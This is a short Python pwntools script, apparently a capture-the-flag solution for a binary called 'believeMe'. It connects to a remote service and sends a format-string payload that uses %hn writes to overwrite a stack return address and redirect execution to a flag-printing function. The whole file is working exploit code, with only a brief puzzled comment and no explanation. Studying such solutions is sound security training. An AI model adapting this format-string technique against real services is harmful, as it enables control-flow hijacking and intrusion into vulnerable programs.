#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

local = 0

if local:
    io = process('./believeMe')

else :
    io = remote('18.223.228.52', 13337)

elf = ELF('./believeMe')

target = elf.sym['noxFlag']
# 0804867b
canary = 0xffffdd0c
ret = canary + 0x0c + 4

payload = p32(ret) + p32(ret+2)
payload += '%' + str(0x804-8) + 'c%10$hn'
payload += '%' + str(0x867b - 0x804) + 'c%9$hn'
# ?why can't ?
# print len(payload)
io.recvuntil('????')
io.sendline(payload)
io.interactive()
io.close()
